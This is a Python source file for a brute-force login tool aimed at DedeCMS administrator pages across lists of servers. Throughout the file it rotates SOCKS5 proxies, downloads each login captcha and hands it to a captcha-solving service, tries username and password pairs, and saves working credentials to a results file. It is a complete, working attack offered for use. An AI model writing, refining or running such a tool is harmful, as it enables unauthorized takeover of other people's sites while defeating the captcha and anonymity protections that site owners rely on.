import PIL
import requests
from collections import defaultdict
import threading
import math
import colorama
import argparse
from colorama import Fore, Back, Style
import os
import os.path
import socket
from datetime import datetime
from bs4 import BeautifulSoup
from PIL import Image
import re
from os import environ
import time
from anycaptcha import AnycaptchaClient, HCaptchaTaskProxyless, RecaptchaV2TaskProxyless, RecaptchaV3TaskProxyless, \
    ImageToTextTask, RecaptchaV2Task, HCaptchaTask, FunCaptchaProxylessTask, ZaloTask
import random


def get_Url(server_one):
    new_data = server_one.split("/")
    new_data.pop(1)
    return new_data


def get_PHPSESSID(url_captcha, url_origin, url_login):

        with requests.Session() as s:
            time.sleep(10)
            r = s.get(url_captcha, proxies=get_proxy(), verify=False, timeout=10)

            cookie = requests.utils.dict_from_cookiejar(r.cookies)

            tmp = cookie.get("PHPSESSID")

            log_file.write("PHPSESSID = " + tmp + "\n")

            print("PHPSESSID = " + tmp)

            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q = 0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip,deflate",
                "Origin": url_origin,
                "Referer": url_login,
                "Upgrade-Insecure-Requests": "1",
                "Cookie": "PHPSESSID=" + tmp
            }

            print(headers)

        return headers, tmp


def get_html(headers, url_login):
        header = headers
        session.headers = header
        time.sleep(10)
        r = session.get(url_login, proxies=get_proxy(), verify=False, timeout=10)
        log_file.write(Fore.BLUE + "GET request to " + url_login + Style.RESET_ALL + "\n")
        print(Fore.BLUE + "GET request to " + url_login + Style.RESET_ALL)
        return r.text


def get_data(html, url_picture, tmp):

        time.sleep(10)
        soup = BeautifulSoup(html, 'lxml')
        img_url = url_picture + soup.find('img').get('src').replace('+', ' ')
        res = session.get(img_url, proxies=get_proxy(), stream=True, verify=False, timeout=10)
        img = Image.open(res.raw)
        img.save("/tmp/"+ tmp + ".png")
        log_file.write(Fore.BLUE + "GET request to pictire " + img_url + Style.RESET_ALL + "\n" + "Picture was saved" + "\n")
        print(Fore.BLUE + "GET request to pictire " + img_url + Style.RESET_ALL + "\n" + "Picture was saved")



def demo_imagetotext(tmp):
    api_key = 'API-KEY-HERE'
    captcha_fp = open("/tmp/"+ tmp + ".png", 'rb')
    client = AnycaptchaClient(api_key)
    task = ImageToTextTask(captcha_fp)
    job = client.createTask(task, typecaptcha="text")
    job.join()
    result = job.get_solution_response()
    if result.find("ERROR") == -1:
        log_file.write("Captcha: " + result + "\n")
        print("Captcha: " + result)
        os.remove("/tmp/" + tmp + ".png")
        return result



def get_proxy():
    proxy_random = random.choice(working_proxy)

    proxy = {
        "socks5": proxy_random
    }
    log_file.write("Proxy: " + proxy_random + "\n")
    print("Proxy: " + proxy_random)
    return proxy


def brute(usernames, passwords, headers):

    credentials = {
        "gotopage": "",
        "dopost": "login",
        "adminstyle": "newdedecms",
        "userid": usernames,
        "pwd": passwords,
        "validate": demo_imagetotext(headers["Cookie"].split("=")[1]),
        "sm1": ""
    }

    time.sleep(10)

    req_post = requests.post(url_login, proxies=get_proxy(), data=credentials, headers=headers, verify=False, timeout=10)

    log_file.write(Fore.BLUE + "POST request with credentials to: " + url_login + Style.RESET_ALL + "\n" + "Username: " + usernames + " " + "Password: " + passwords + "\n")
    print(Fore.BLUE + "POST request with credentials to: " + url_login + Style.RESET_ALL + "\n" + "Username: " + usernames + " " + "Password: " + passwords)

    if req_post.text.find("用户名或者密码错误!") != -1:
        log_file.write(Fore.RED + "User or password incorrect: " + usernames + ":" + passwords + Style.RESET_ALL + "\n" + "\n")
        print(Fore.RED + "User or password incorrect: " + usernames + ":" + passwords + Style.RESET_ALL + "\n")
        return "UPI"
    if req_post.text.find("验证码不正确!") != -1:
        log_file.write(Fore.YELLOW + "Wrong captcha" + Style.RESET_ALL +"\n" + "\n")
        print(Fore.YELLOW + "Wrong captcha" + Style.RESET_ALL +"\n")
        return "CE"
    if req_post.text.find("成功登录，正在转向管理管理主页！") != -1:
        log_file.write(Fore.GREEN + "Login successful: " + usernames + ":" + passwords + Style.RESET_ALL + "\n")
        print(Fore.GREEN + "Login successful: " + usernames + ":" + passwords + Style.RESET_ALL + "\n")
        result_file.write(
            "Server: " + url_login + "\n" + "Username: " + usernames + "\n" + " Password: " + passwords + "\n" + "\n")
        return "OK"
    if req_post.text.find("你的用户名不存在!") != -1:
        log_file.write(Fore.RED + "User not exist:" + usernames + Style.RESET_ALL + "\n" + "\n")
        print(Fore.RED + "User not exist:" + usernames + Style.RESET_ALL)
        return "UNE"
    if req_post.text.find("你的密码错误!") != -1:
        log_file.write(Fore.RED + "Password is wrong: " + "Username:" + usernames + " Password:" + passwords + Style.RESET_ALL + "\n" + "\n")
        print(Fore.RED + "Password is wrong: " + "Username:" + usernames + " Password:" + passwords + Style.RESET_ALL)
        return "WP"
    else:
        log_file.write(Fore.YELLOW + "Differences in response" + Style.RESET_ALL + "\n" + "\n")
        print(Fore.YELLOW + "Differences in response" + Style.RESET_ALL)
        temp_url_to_save = new_data[1].split(".")
        url_to_save = ""
        for i in temp_url_to_save:
            url_to_save = url_to_save + i + "_"
        url_to_save = url_to_save[:-1]
        if os.path.isfile("./differences/" + url_to_save):
            difference_file = open("./differences/" + url_to_save, "w+")
            difference_file.write("Server: " + url_login + " have difference in response" + "\n")
            difference_file.write(req_post.text + "\n")
            difference_file.write("Username: " + usernames + " Password: " + passwords + "\n")
        else:
            difference_file = open("./differences/" + url_to_save, "x")
            difference_file.close()
        return "NS"



if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--server', type=str)
    parser.add_argument('-l', '--logs', type=str)
    parser.add_argument('-r', '--result', type=str)
    parser.add_argument('-e', '--error', type=str)
    args = parser.parse_args()

    if os.path.exists("./result"):
        pass
    else:
        os.mkdir("./result")

    if os.path.exists("./logs"):
        pass
    else:
        os.mkdir("./logs")

    if os.path.exists("./differences"):
        pass
    else:
        os.mkdir("./differences")

    if os.path.exists("./error"):
        pass
    else:
        os.mkdir("./error")


    now = datetime.now()
    dt_string = now.strftime("%H-%M_%d-%m-%Y")
    logs_with_parse = dt_string + "_" +str(args.logs)
    log_file = open("./logs/" + logs_with_parse + ".txt", "w+")
    result_file = open("./result/" + str(args.result), "w+")
    error_file = open("./error/" + str(args.error), "w+")

    requests.packages.urllib3.disable_warnings()

    with open("proxy.txt", "r") as proxy_file:
        proxies = proxy_file.read().splitlines()

    working_proxy = []

    for test_proxy in proxies:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('IP-PROXY', int(test_proxy)))
            if result == 0:
                log_file.write("Port " + str(test_proxy) + " is open" + "\n")
                print("Port " + test_proxy + " is open")
                working_proxy.append("IP-PROXY:" + test_proxy)
            else:
                log_file.write("Port " + test_proxy + " is not open" + "\n")
                print("Port " + test_proxy + " is not open")
            sock.close()
        except socket.error as e:
            print(e)

    session = requests.Session()

    with open("./server/" + str(args.server), "r") as server_list:
        one_server = server_list.read().splitlines()
    with open("usernames.txt", "r") as user_list:
        one_user = user_list.read().splitlines()
    with open("passwords.txt", "r") as pass_list:
        one_pass = pass_list.read().splitlines()


    def check_passwords(user, passw, server, check_creds):
        try:
            key_answer = "NOT_OK"
            if user in check_creds and server in check_creds[user]:
                return "UNE"
            else:
                while key_answer != "OK":
                    pas_headers, tmp = get_PHPSESSID(url_captcha, url_origin, url_login)
                    get_data(get_html(pas_headers, url_login), url_picture, tmp)
                    key_answer = brute(user, passw, pas_headers)
                    if key_answer == "UNE":
                        if (user not in check_creds) or (user in check_creds and server not in check_creds[user]):
                            if user not in check_creds:
                                check_creds[user] = []
                            check_creds[user].append(server)
                            print(check_creds)
                            print("No data")
                        else:
                            return check_creds
                    if key_answer == "UPI" or key_answer == "NS" or key_answer == "WP":
                        return key_answer
        except Exception as e:
            log_file.write(Fore.RED + "ERROR:" + Style.RESET_ALL+"\n")
            log_file.write(str(e))
            error_file.write(Fore.RED + "ERROR:" + Style.RESET_ALL + "\n")
            error_file.write(str(e))
            print(Fore.RED + "ERROR:" + Style.RESET_ALL)
            print(str(e))
            print(check_creds)


    response_messages = ["UPI", "NS", "WP"]

    check_creds = defaultdict(list)

    for user in range(len(one_user)):
        for passw in range(len(one_pass)):
            for server in range(len(one_server)):

                new_data = get_Url(one_server[server])

                url_login = new_data[0] + "//" + new_data[1] + "/dede/login.php"
                url_picture = new_data[0] + "//" + new_data[1] + "/"
                url_captcha = new_data[0] + "//" + new_data[1] + "/" + "include/vdimgck.php"
                url_origin = new_data[0] + "//" + new_data[1]

                if check_passwords(str(one_user[user]), str(one_pass[passw]), str(one_server[server]), check_creds) == "UNE":
                    continue


